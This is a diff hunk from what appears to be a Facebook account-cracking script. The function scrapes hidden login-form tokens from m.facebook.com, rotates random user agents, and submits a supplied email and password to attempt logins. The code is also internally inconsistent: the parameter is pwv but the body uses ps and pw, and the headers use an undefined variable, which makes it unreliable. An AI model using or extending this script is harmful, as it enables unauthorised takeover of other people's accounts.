@@ -1163,17 +1163,18 @@ def m5(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    free_fb = session.get(f'https://m.facebook.com').text
-   log_data = {
-   "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   'charset_test':re.search('name="charset_test" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "charset_test":re.search('name="charset_test" value="(.*?)"', str(free_fb)).group(1),
+   "version":re.search('name="version" value="(.*?)"', str(free_fb)).group(1),
+   "ajax":re.search('name="ajax" value="(.*?)"', str(free_fb)).group(1),
+   "width":re.search('name="width" value="(.*?)"', str(free_fb)).group(1),
+   "pxr":re.search('name="pxr" value="(.*?)"', str(free_fb)).group(1),
+   "gps":re.search('name="gps" value="(.*?)"', str(free_fb)).group(1),
    "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
    "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
    "email":idf,
-   "pass":ps,
-   "login":"Log In"}
+   "pass":pw,
+   "login":"Log In"} 
    head = {'Host': 'www.facebook.com',
    'content-length': str(len(data)),
    'content-type': 'application/reports+json',
